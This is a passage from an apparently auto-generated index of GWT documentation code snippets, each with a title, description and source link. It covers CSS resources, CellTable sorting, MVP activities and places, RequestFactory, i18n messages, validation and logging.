https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideOrganizingProjects.md#2025-04-09_snippet_11\n\nLANGUAGE: html\nCODE:\n```\n<stylesheet src=\"_css-url_\"/>\n```\n\n----------------------------------------\n\nTITLE: CSS Runtime Substitution Example\nDESCRIPTION: Shows how to use @eval directive for runtime value substitution in CSS.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_12\n\nLANGUAGE: css\nCODE:\n```\n@eval userBackground com.module.UserPreferences.getUserBackground();\ndiv {\n  background: userBackground;\n}\n```\n\n----------------------------------------\n\nTITLE: Complex Conditional CSS with Logical Operators in GSS\nDESCRIPTION: Demonstrates using logical operators (&&, ||, !) in GSS conditional statements to create complex browser and locale targeting rules with multiple branches.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideGssVsCss.md#2025-04-09_snippet_5\n\nLANGUAGE: css\nCODE:\n```\n@if (is(\"ie8\") || is(\"ie9\") && !is(\"locale\",  \"en\")) {\n\n  .foo {padding: 8px;}\n\n} @elseif (is(\"safari\")) {\n\n  .foo {padding: 18px;}\n\n} @else {\n\n  .foo {padding: 28px;}\n\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Stocks in GWT Application\nDESCRIPTION: Methods for adding new stock symbols to the datastore and display table. Includes validation of stock symbols and async service calls.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/appengine.md#2025-04-09_snippet_27\n\nLANGUAGE: java\nCODE:\n```\nprivate void addStock() {\n    final String symbol = newSymbolTextBox.getText().toUpperCase().trim();\n    newSymbolTextBox.setFocus(true);\n\n    // Stock code must be between 1 and 10 chars that are numbers, letters, or dots.\n    if (!symbol.matches(\"^[0-9a-zA-Z\\.]{1,10}$\")) {\n      Window.alert(\"'\" + symbol + \"' is not a valid symbol.\");\n      newSymbolTextBox.selectAll();\n      return;\n    }\n\n    newSymbolTextBox.setText(\"\");\n\n    // Don't add the stock if it's already in the table.\n    if (stocks.contains(symbol))\n      return;\n\n    addStock(symbol);\n  }\n\n  private void addStock(final String symbol) {\n    stockService.addStock(symbol, new AsyncCallback<Void>() {\n      public void onFailure(Throwable error) {\n      }\n      public void onSuccess(Void ignore) {\n        displayStock(symbol);\n      }\n    });\n  }\n\n  private void displayStock(final String symbol) {\n    // Add the stock to the table.\n    int row = stocksFlexTable.getRowCount();\n    stocks.add(symbol);\n\n...\n```\n\n----------------------------------------\n\nTITLE: Using NotStrict Annotation with CssResource in Java\nDESCRIPTION: Shows how to use the @NotStrict annotation to disable strict mode in CssResource, which allows class selectors that don't match String accessor functions. This is recommended for applications transitioning from external CSS files to CssResource.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_33\n\nLANGUAGE: java\nCODE:\n```\ninterface MyCssResource extends CssResource {\n  String foo();\n}\n\ninterface Resources {\n  @Source(\"my.css\")\n  @CssResource.NotStrict\n  MyCssResource css();\n}\n```\n\nLANGUAGE: css\nCODE:\n```\n/* This is ok */\n.foo {}\n\n/* This would normally generate a compile error in strict mode */\n.other {}\n```\n\n----------------------------------------\n\nTITLE: Implementing Column Sorting with AsyncDataProvider in GWT CellTable\nDESCRIPTION: Shows implementation of sortable columns in a CellTable using AsyncDataProvider for server-side sorting. Includes setup of asynchronous data loading and handling of sort events with ColumnSortEvent.AsyncHandler.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiCellTable.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\n/**\n * Entry point classes define <code>onModuleLoad()</code>.\n */\npublic class CellTableExample implements EntryPoint {\n\n  // A simple data type that represents a contact.\n  private static class Contact {\n    private final String address;\n    private final String name;\n\n    public Contact(String name, String address) {\n      this.name = name;\n      this.address = address;\n    }\n  }\n\n  // The list of data to display.\n  private static List<Contact> CONTACTS = Arrays.asList(new Contact(\"John\",\n      \"123 Fourth Road\"), new Contact(\"Mary\", \"222 Lancer Lane\"), new Contact(\n      \"Zander\", \"94 Road Street\"));\n\n  public void onModuleLoad() {\n\n    // Create a CellTable.\n    final CellTable<Contact> table = new CellTable<Contact>();\n\n    // Create name column.\n    TextColumn<Contact> nameColumn = new TextColumn<Contact>() {\n      @Override\n      public String getValue(Contact contact) {\n        return contact.name;\n      }\n    };\n\n    // Make the name column sortable.\n    nameColumn.setSortable(true);\n\n    // Create address column.\n    TextColumn<Contact> addressColumn = new TextColumn<Contact>() {\n      @Override\n      public String getValue(Contact contact) {\n        return contact.address;\n      }\n    };\n\n    // Add the columns.\n    table.addColumn(nameColumn, \"Name\");\n    table.addColumn(addressColumn, \"Address\");\n\n    // Set the total row count. You might send an RPC request to determine the\n    // total row count.\n    table.setRowCount(CONTACTS.size(), true);\n\n    // Set the range to display. In this case, our visible range is smaller than\n    // the data set.\n    table.setVisibleRange(0, 3);\n\n    // Create a data provider.\n    AsyncDataProvider<Contact> dataProvider = new AsyncDataProvider<Contact>() {\n      @Override\n      protected void onRangeChanged(HasData<Contact> display) {\n        final Range range = display.getVisibleRange();\n\n        // Get the ColumnSortInfo from the table.\n        final ColumnSortList sortList = table.getColumnSortList();\n\n        // This timer is here to illustrate the asynchronous nature of this data\n        // provider. In practice, you would use an asynchronous RPC call to\n        // request data in the specified range.\n        new Timer() {\n          @Override\n          public void run() {\n            int start = range.getStart();\n            int end = start + range.getLength();\n            // This sorting code is here so the example works. In practice, you\n            // would sort on the server.\n            Collections.sort(CONTACTS, new Comparator<Tester.Contact>() {\n              public int compare(Contact o1, Contact o2) {\n                if (o1 == o2) {\n                  return 0;\n                }\n\n                // Compare the name columns.\n                int diff = -1;\n                if (o1 != null) {\n                  diff = (o2 != null) ? o1.name.compareTo(o2.name) : 1;\n                }\n                return sortList.get(0).isAscending() ? diff : -diff;\n              }\n            });\n            List<Contact> dataInRange = CONTACTS.subList(start, end);\n\n            // Push the data back into the list.\n            table.setRowData(start, dataInRange);\n          }\n        }.schedule(2000);\n      }\n    };\n\n    // Connect the list to the data provider.\n    dataProvider.addDataDisplay(table);\n\n    // Add a ColumnSortEvent.AsyncHandler to connect sorting to the\n    // AsyncDataPRrovider.\n    AsyncHandler columnSortHandler = new AsyncHandler(table);\n    table.addColumnSortHandler(columnSortHandler);\n\n    // We know that the data is sorted alphabetically by default.\n    table.getColumnSortList().push(nameColumn);\n\n    // Add it to the root panel.\n    RootPanel.get().add(table);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing ActivityMapper in GWT\nDESCRIPTION: Implementation of ActivityMapper that maps Places to their corresponding Activities, managing the creation of appropriate Activity instances based on Place types.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideMvpActivitiesAndPlaces.md#2025-04-09_snippet_12\n\nLANGUAGE: java\nCODE:\n```\npublic class AppActivityMapper implements ActivityMapper {\n    private ClientFactory clientFactory;\n\n    public AppActivityMapper(ClientFactory clientFactory) {\n        super();\n        this.clientFactory = clientFactory;\n    }\n\n    @Override\n    public Activity getActivity(Place place) {\n        if (place instanceof HelloPlace)\n            return new HelloActivity((HelloPlace) place, clientFactory);\n        else if (place instanceof GoodbyePlace)\n            return new GoodbyeActivity((GoodbyePlace) place, clientFactory);\n        return null;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Debug Borders to GWT Panels for Layout Troubleshooting\nDESCRIPTION: This snippet demonstrates a debugging technique for GWT layouts by adding colored borders to panels. It sets border widths and applies custom style names to visualize panel boundaries during development.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_UI.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nVerticalPanel vertPanel = new VerticalPanel();\n\n    DockPanel dockPanel = new DockPanel();\n    dockPanel.setWidth(\"100%\");\n    dockPanel.add(new Button(\"leftButton\"), DockPanel.WEST);\n    dockPanel.add(new Button(\"rightButton\"), DockPanel.EAST);\n    dockPanel.setStylePrimaryName(\"dockPanel\");\n    dockPanel.setBorderWidth(5);\n\n    vertPanel.add(dockPanel);\n    vertPanel.setStylePrimaryName(\"vertPanel\");\n    vertPanel.setBorderWidth(5);\n\n    RootPanel.get().add(vertPanel);\n```\n\n----------------------------------------\n\nTITLE: Defining a Simple GoodbyeView Interface in GWT MVP\nDESCRIPTION: A simple view interface that extends IsWidget and defines a method to set a name. Used in the Activities and Places framework with MVP architecture.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideMvpActivitiesAndPlaces.md#2025-04-09_snippet_0\n\nLANGUAGE: java\nCODE:\n```\npublic interface GoodbyeView extends IsWidget {\n    void setName(String goodbyeName);\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing XSRF Protected Service Interface Using Extension\nDESCRIPTION: Java interface definition that extends XsrfProtectedService to enable XSRF protection\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideSecurityRpcXsrf.md#2025-04-09_snippet_3\n\nLANGUAGE: java\nCODE:\n```\npackage com.example.foo.client;\n\n  import com.google.gwt.user.client.rpc.XsrfProtectedService;\n\n  public interface MyService extends XsrfProtectedService {\n    public String myMethod(String s);\n  }\n```\n\n----------------------------------------\n\nTITLE: Using RequestFactory with Receiver in GWT\nDESCRIPTION: Example of making an asynchronous request using RequestFactory and handling the response with a Receiver implementation.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideRequestFactory.md#2025-04-09_snippet_7\n\nLANGUAGE: java\nCODE:\n```\nrequestFactory.employeeRequest().findEmployee(employeeId).fire(\n    new Receiver<EmployeeProxy>() {\n      @Override\n      public void onSuccess(EmployeeProxy employee) {\n      ...\n      }\n    });\n```\n\n----------------------------------------\n\nTITLE: Using Constants Interface in GWT\nDESCRIPTION: Example of instantiating and using the MyConstants interface to access localized strings using GWT.create().\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideI18nConstants.md#2025-04-09_snippet_3\n\nLANGUAGE: java\nCODE:\n```\npublic void useMyConstants() {\n  MyConstants myConstants = GWT.create(MyConstants.class);\n  Window.alert(myConstants.helloWorld());\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing PlaceHistoryMapper Interface in GWT\nDESCRIPTION: Definition of PlaceHistoryMapper interface that declares available Places in the application using @WithTokenizers annotation.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideMvpActivitiesAndPlaces.md#2025-04-09_snippet_11\n\nLANGUAGE: java\nCODE:\n```\n@WithTokenizers({HelloPlace.Tokenizer.class, GoodbyePlace.Tokenizer.class})\npublic interface AppPlaceHistoryMapper extends PlaceHistoryMapper\n{\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing SplitLayoutPanel in GWT\nDESCRIPTION: Demonstrates creation of a draggable split panel layout with navigation, list, and details sections.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiPanels.md#2025-04-09_snippet_3\n\nLANGUAGE: java\nCODE:\n```\nSplitLayoutPanel p = new SplitLayoutPanel();\np.addWest(new HTML(\"navigation\"), 128);\np.addNorth(new HTML(\"list\"), 384);\np.add(new HTML(\"details\"));\n```\n\n----------------------------------------\n\nTITLE: Optimized CSS After Property Merging in GWT\nDESCRIPTION: Shows the result of GWT's property merging optimization, which combines selectors for rules with identical properties to produce more compact CSS while preserving the original functionality.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_32\n\nLANGUAGE: css\nCODE:\n```\n.a,.b{background:blue;}\n```\n\n----------------------------------------\n\nTITLE: Validating with a Specific Group\nDESCRIPTION: Example showing how to validate an Address object using only the Minimal validation group, which will check only constraints assigned to that group.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideValidation.md#2025-04-09_snippet_9\n\nLANGUAGE: java\nCODE:\n```\nvalidator.validate(address, Minimal.class);\n```\n\n----------------------------------------\n\nTITLE: Serializing List of Person Objects to JSON in GWT\nDESCRIPTION: Illustrates how List and Set properties are encoded as JSON lists using AutoBean. This example shows the serialization of a List<Person>.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideAutoBeans.md#2025-04-09_snippet_4\n\nLANGUAGE: json\nCODE:\n```\n[ { \"name\" : \"John Doe\" } , { \"name\" : \"Jim Smith\" } ]\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Plural Forms in GWT Messages Interface\nDESCRIPTION: Example showing how to handle different plural forms in English text using the Messages interface with @PluralCount annotation. This demonstrates displaying 'one tree' vs 'n trees' based on count.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideI18nMessages.md#2025-04-09_snippet_5\n\nLANGUAGE: text\nCODE:\n```\nYou have one tree.\nYou have 2 trees.\n```\n\n----------------------------------------\n\nTITLE: Implementing a Custom Data Source with RangeChangeEvent in GWT\nDESCRIPTION: This example demonstrates how to handle RangeChangeEvents from a CellList and manually push data to the widget. It creates a RangeChangeEvent.Handler and updates the widget with new data based on the requested range.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiCellWidgets.md#2025-04-09_snippet_8\n\nLANGUAGE: java\nCODE:\n```\n/**\n * Example of using a {@link RangeChangeEvent.Handler} to push data into a\n * {@link CellList} when the range changes.\n */\npublic class RangeChangeHandlerExample implements EntryPoint {\n\n  @Override\n  public void onModuleLoad() {\n    // Create a CellList.\n    CellList<String> cellList = new CellList<String>(new TextCell());\n\n    // Add a range change handler.\n    cellList.addRangeChangeHandler(new RangeChangeEvent.Handler() {\n      @Override\n      public void onRangeChange(RangeChangeEvent event) {\n        Range range = event.getNewRange();\n        int start = range.getStart();\n        int length = range.getLength();\n\n        // Create the data to push into the view. At this point, you could send\n        // an asynchronous RPC request to a server.\n        List<String> data = new ArrayList<String>();\n        for (int i = start; i < start + length; i++) {\n          data.add(\"Item \" + i);\n        }\n\n        // Push the data into the list.\n        updateRowData(start, data);\n      }\n    });\n\n    // Force the cellList to fire an initial range change event.\n    cellList.setVisibleRangeAndClearData(new Range(0, 25), true);\n\n    // Create paging controls.\n    SimplePager pager = new SimplePager();\n    pager.setDisplay(cellList);\n\n    // Add the widgets to the root panel.\n    VerticalPanel vPanel = new VerticalPanel();\n    vPanel.add(pager);\n    vPanel.add(cellList);\n    RootPanel.get().add(vPanel);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Multiple Style Blocks in UiBinder Templates\nDESCRIPTION: Demonstrates how to define and use multiple CSS style blocks in a single UiBinder template with different field names to avoid style conflicts.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_19\n\nLANGUAGE: xml\nCODE:\n```\n<ui:UiBinder xmlns:ui='urn:ui:com.google.gwt.uibinder'>\n  <ui:style>\n    .pretty { background-color: Skyblue; }\n  </ui:style>\n\n  <ui:style field='otherStyle'>\n    .pretty { background-color: Orange; }\n  </ui:style>\n\n  <div class='{style.pretty}'>\n    Hello, <span class='{otherStyle.pretty}' ui:field='nameSpan'/>.\n  </div>\n\n</ui:UiBinder>\n```\n\n----------------------------------------\n\nTITLE: GWT EntryPoint Implementation\nDESCRIPTION: Java implementation of the GWT EntryPoint interface with a basic Material Design button\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/create.md#2025-04-09_snippet_7\n\nLANGUAGE: java\nCODE:\n```\npackage org.gwtproject.tutorial.client;\n\nimport com.google.gwt.core.client.EntryPoint;\nimport com.google.gwt.user.client.ui.RootPanel;\nimport com.vaadin.polymer.paper.widget.PaperButton;\n\npublic class TodoList implements EntryPoint {\n  public void onModuleLoad() {\n    // Use Widget API to Create a <paper-button>\n    PaperButton button = new PaperButton(\"Press me!\");\n    button.setRaised(true);\n    RootPanel.get().add(button);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using JsArray in GWT Module Entry Point\nDESCRIPTION: This snippet demonstrates how to use the JsArray class in a GWT module entry point. It retrieves an array of Customer objects and iterates through them, displaying each customer's full name.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsOverlay.md#2025-04-09_snippet_5\n\nLANGUAGE: java\nCODE:\n```\nclass MyModuleEntryPoint implements EntryPoint {\n  public void onModuleLoad() {\n    JsArray<Customer> cs = getCustomers();\n    for (int i = 0, n = cs.length(); i < n; ++i) {\n      Window.alert(\"Hello, \" + cs.get(i).getFullName());\n    }\n  }\n\n  // Return the whole JSON array, as is\n  private final native JsArray<Customer> getCustomers() /*-{\n    return $wnd.jsonData;\n  }-*/;\n}\n```\n\n----------------------------------------\n\nTITLE: Conditional Logging Code Compilation\nDESCRIPTION: Example showing how to conditionally compile logging code using LogConfiguration.loggingIsEnabled().\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideLogging.md#2025-04-09_snippet_7\n\nLANGUAGE: java\nCODE:\n```\nif (LogConfiguration.loggingIsEnabled()) {\n    String logMessage = doSomethingExpensiveThatDoesNotNormallyCompileOut();\n    logger.severe(logMessage);\n  }\n```\n\n----------------------------------------\n\nTITLE: Calling Exported Java Method from JavaScript\nDESCRIPTION: This snippet shows how to call a Java method that has been exported to the global JavaScript scope. It demonstrates the usage of the exported 'add' function.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsJSNI.md#2025-04-09_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\n$wnd.add(5);\n```\n\n----------------------------------------\n\nTITLE: Configuring Deferred Binding Replacement Rules in GWT Module XML\nDESCRIPTION: XML configuration from Popup.gwt.xml that demonstrates how to set up browser-specific implementations using the replace-with directive. It defines default, Mozilla, and IE-specific implementations of PopupImpl.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsDeferred.md#2025-04-09_snippet_0\n\nLANGUAGE: xml\nCODE:\n```\n<module>\n\n  <!--  ... other configuration omitted ... -->\n\n  <!-- Fall through to this rule is the browser isn't IE or Mozilla -->\n  <replace-with class=\"com.google.gwt.user.client.ui.impl.PopupImpl\">\n    <when-type-is class=\"com.google.gwt.user.client.ui.impl.PopupImpl\"/>\n  </replace-with>\n\n  <!-- Mozilla needs a different implementation due to issue #410 -->\n  <replace-with class=\"com.google.gwt.user.client.ui.impl.PopupImplMozilla\">\n    <when-type-is class=\"com.google.gwt.user.client.ui.impl.PopupImpl\" />\n    <any>\n      <when-property-is name=\"user.agent\" value=\"gecko\"/>\n      <when-property-is name=\"user.agent\" value=\"gecko1_8\" />\n    </any>\n  </replace-with>\n\n  <!-- IE has a completely different popup implementation -->\n  <replace-with class=\"com.google.gwt.user.client.ui.impl.PopupImplIE6\">\n    <when-type-is class=\"com.google.gwt.user.client.ui.impl.PopupImpl\"/>\n    <when-property-is name=\"user.agent\" value=\"ie6\" />\n  </replace-with>\n</module>\n```\n\n----------------------------------------\n\nTITLE: Using LazyDomElement in GWT UiBinder\nDESCRIPTION: This Java snippet demonstrates the use of LazyDomElement to defer DOM element retrieval until needed, potentially improving performance in large pages with many DOM elements.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_31\n\nLANGUAGE: java\nCODE:\n```\npublic class HelloWorld extends UIObject { // Could extend Widget instead\n  interface MyUiBinder extends UiBinder<DivElement, HelloWorld> {}\n  private static final MyUiBinder uiBinder = GWT.create(MyUiBinder.class);\n\n  @UiField LazyDomElement<SpanElement> nameSpan;\n\n  public HelloWorld() {\n    // createAndBindUi initializes this.nameSpan\n    setElement(uiBinder.createAndBindUi(this));\n  }\n\n  public void setName(String name) { nameSpan.get().setInnerText(name); }\n}\n```\n\n----------------------------------------\n\nTITLE: Record DTO Creation Helper Method\nDESCRIPTION: Helper method to transform Hibernate Record entities into RecordDTO objects.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/using_gwt_with_hibernate.md#2025-04-09_snippet_20\n\nLANGUAGE: java\nCODE:\n```\nprivate RecordDTO createRecordDTO(Record record) {\n  return new RecordDTO(record.getId(), record.getTitle(), record.getYear(), record.getPrice());\n}\n```\n\n----------------------------------------\n\nTITLE: Refactoring StockWatcher Load Logic\nDESCRIPTION: Basic refactoring of the StockWatcher initialization code to separate the loading logic into a dedicated method.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/appengine.md#2025-04-09_snippet_16\n\nLANGUAGE: java\nCODE:\n```\npublic void onModuleLoad() {\n    loadStockWatcher();\n  }\n\n  private void loadStockWatcher() {\n    // Create table for stock data.\n    stocksFlexTable.setText(0, 0, \"Symbol\");\n    stocksFlexTable.setText(0, 1, \"Price\");\n    stocksFlexTable.setText(0, 2, \"Change\");\n    stocksFlexTable.setText(0, 3, \"Remove\");\n    ...\n  }\n```\n\n----------------------------------------\n\nTITLE: Retrieving User Agent String in GWT using JSNI\nDESCRIPTION: This code snippet demonstrates how to use a JSNI (JavaScript Native Interface) method in GWT to retrieve the browser's UserAgent string. This can be useful for implementing browser-specific dependencies.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBrowser.md#2025-04-09_snippet_0\n\nLANGUAGE: java\nCODE:\n```\npublic static native String getUserAgent() /*-{\n     return navigator.userAgent.toLowerCase();\n  }-*/;\n```\n\n----------------------------------------\n\nTITLE: Long-Running Computations with IncrementalCommand in Java for GWT\nDESCRIPTION: Illustrates the use of IncrementalCommand to perform long-running computations without triggering browser unresponsive script warnings. It breaks the computation into chunks and allows the browser to remain responsive.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsDelayed.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\npublic class IncrementalCommandTest implements EntryPoint {\n\n  // Number of times doWork() is called\n  static final int MAX_LOOPS = 10000;\n\n  // Tight inner loop in doWork()\n  static final int WORK_LOOP_COUNT = 50;\n\n  // Number of times doWork() is called in IncrementalCommand before\n  // returning control to the event loop\n  static final int WORK_CHUNK = 100;\n\n  // A button to kick off the computation\n  Button button;\n\n  public void onModuleLoad() {\n    button = new Button(\"Start Computation\");\n\n    button.addClickHandler(new ClickHandler () {\n      public void onClick(ClickEvent event) {\n       doWorkIncremental();\n      }\n    }\n  }\n\n  /**\n   * Create a IncrementalCommand instance that gets called back every so often\n   * until all the work it has to do is complete.\n   */\n  private void doWorkIncremental () {\n\n    // Turn off the button so it won't start processing again.\n    button.setEnabled(false);\n\n    IncrementalCommand ic = new IncrementalCommand(){\n      int counter = 0;\n\n      public boolean execute() {\n        for (int i=0;i<WORK_CHUNK;i++) {\n          counter++;\n\n          result += doWork();\n\n          // If we have done all the work, exit with a 'false'\n          // return value to terminate further execution.\n          if (counter == MAX_LOOPS) {\n\n            // Re-enable button\n            button.setEnabled(true);\n\n            // ... other end of computation processing ...\n\n            return false;\n          }\n        }\n        // Call the execute function again.\n        return true;\n      }\n    };\n\n    // Schedule the IncrementalCommand instance to run when\n    // control returns to the event loop by returning 'true'\n    Scheduler.get().scheduleIncremental(ic);\n  }\n\n  /**\n   * Routine that keeps the CPU busy for a while.\n   * @return an integer result of the calculation\n   */\n  private int doWork() {\n    int result;\n\n    // ... computation...\n\n    return result;\n  }\n```\n\n----------------------------------------\n\nTITLE: Fetching Entity Relationships with RequestFactory in Java GWT\nDESCRIPTION: Demonstrates how to use the with() method to instruct RequestFactory to populate related entities when querying the server. Without this, related entities are not automatically loaded.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideRequestFactory.md#2025-04-09_snippet_20\n\nLANGUAGE: java\nCODE:\n```\nRequest<Person> findReq = requestFactory.personRequest().find(personId).with(\"address\");\n```\n\n----------------------------------------\n\nTITLE: Implementing Select Forms with GWT Messages Interface\nDESCRIPTION: Example showing how to use select forms to choose messages based on gender or other attributes. Uses @Select annotation with enum values to select appropriate pronoun variations.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideI18nMessages.md#2025-04-09_snippet_7\n\nLANGUAGE: java\nCODE:\n```\npublic enum Gender {\n  MALE,\n  FEMALE,\n  UNKNOWN\n}\n\npublic interface MyMessages extends Messages {\n  @DefaultMessage(\"{0} gave you their credits.\")\n  @AlternateMessage({\n      \"MALE\", \"{0} gave you his credits.\",\n      \"FEMALE\", \"{0} gave you her credits.\"\n  })\n  String gaveCredits(String name, @Select Gender gender);\n}\n```\n\n----------------------------------------\n\nTITLE: Applying Constraints to Different Validation Groups\nDESCRIPTION: Example showing how to assign constraints to specific validation groups in an Address class, allowing for selective validation based on context.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideValidation.md#2025-04-09_snippet_7\n\nLANGUAGE: java\nCODE:\n```\npublic class Address {\n  @NotEmpty(groups = Minimal.class)\n  @Size(max=50)\n  private String street;\n  \n  @NotEmpty\n  private String city;\n  \n  @NotEmpty(groups = {Minimal.class, Default.class})\n  private String zipCode;\n  ...\n}\n```\n\n----------------------------------------\n\nTITLE: Row Data Setting Implementation in GWT View\nDESCRIPTION: View implementation showing how row data is rendered using column definitions.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture-2.md#2025-04-09_snippet_13\n\nLANGUAGE: java\nCODE:\n```\npublic class ContactsViewImpl<T> extends Composite implements ContactsView<T> {\n    ...\n    public void setRowData(List<T> rowData) {\n      contactsTable.removeAllRows();\n      this.rowData = rowData;\n\n      for (int i = 0; i < rowData.size(); ++i) {\n        T t = rowData.get(i);\n        for (int j = 0; j < columnDefinitions.size(); ++j) {\n          ColumnDefinition<T> columnDefinition = columnDefinitions.get(j);\n          contactsTable.setWidget(i, j, columnDefinition.render(t));\n        }\n      }\n    }\n    ...\n  }\n```\n\n----------------------------------------\n\nTITLE: Remote Logging Configuration\nDESCRIPTION: XML configuration to enable SimpleRemoteHandler for remote logging in GWT.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideLogging.md#2025-04-09_snippet_6\n\nLANGUAGE: xml\nCODE:\n```\n<set-property name=\"gwt.logging.simpleRemoteHandler\" value=\"ENABLED\" />\n```\n\n----------------------------------------\n\nTITLE: Implementing Place Class in GWT\nDESCRIPTION: Implementation of a Place class with its PlaceTokenizer for URL serialization. Shows how to store and retrieve state information in the URL token.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideMvpActivitiesAndPlaces.md#2025-04-09_snippet_10\n\nLANGUAGE: java\nCODE:\n```\npublic class HelloPlace extends Place {\n    private String helloName;\n\n    public HelloPlace(String token) {\n        this.helloName = token;\n    }\n\n    public String getHelloName() {\n        return helloName;\n    }\n\n    public static class Tokenizer implements PlaceTokenizer<HelloPlace> {\n        @Override\n        public String getToken(HelloPlace place) {\n            return place.getHelloName();\n        }\n\n        @Override\n        public HelloPlace getPlace(String token) {\n            return new HelloPlace(token);\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Event Handling for HTML Table in GWT\nDESCRIPTION: Implementation of table click event handling that works with the optimized HTML-based table rendering approach.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture-2.md#2025-04-09_snippet_22\n\nLANGUAGE: java\nCODE:\n```\npublic class ContactsViewImpl<T> extends Composite implements ContactsView<T> {\n  ...\n  @UiHandler(\"contactsTable\")\n  void onTableClicked(ClickEvent event) {\n    if (presenter != null) {\n      EventTarget target = event.getNativeEvent().getEventTarget();\n      Node node = Node.as(target);\n      TableCellElement cell = findNearestParentCell(node);\n      if (cell == null) {\n        return;\n      }\n\n      TableRowElement tr = TableRowElement.as(cell.getParentElement());\n      int row = tr.getSectionRowIndex();\n\n      if (cell != null) {\n        if (shouldFireClickEvent(cell)) {\n          presenter.onItemClicked(rowData.get(row));\n        }\n        if (shouldFireSelectEvent(cell)) {\n          presenter.onItemSelected(rowData.get(row));\n        }\n      }\n  ...\n```\n\n----------------------------------------\n\nTITLE: Complex CSS Styling for GWT MenuBar Widget\nDESCRIPTION: Demonstrates complex CSS styling for the GWT MenuBar widget, including styles for menu items and selected states.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiCss.md#2025-04-09_snippet_4\n\nLANGUAGE: css\nCODE:\n```\n.gwt-MenuBar { \n    /* properties applying to the menu bar itself */ \n}\n.gwt-MenuBar .gwt-MenuItem { \n    /* properties applying to the menu bar's menu items */ \n}\n.gwt-MenuBar .gwt-MenuItem-selected { \n    /* properties applying to the menu bar's selected menu items */\n}\n```\n\n----------------------------------------\n\nTITLE: Defining GWT MeetingView Interface\nDESCRIPTION: This snippet defines the MeetingView interface used in the GWT application. It declares a method to disable the save button, which is called by the presenter when necessary.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/testing_methodologies_using_gwt.md#2025-04-09_snippet_3\n\nLANGUAGE: Java\nCODE:\n```\npublic interface MeetingView {\n  void 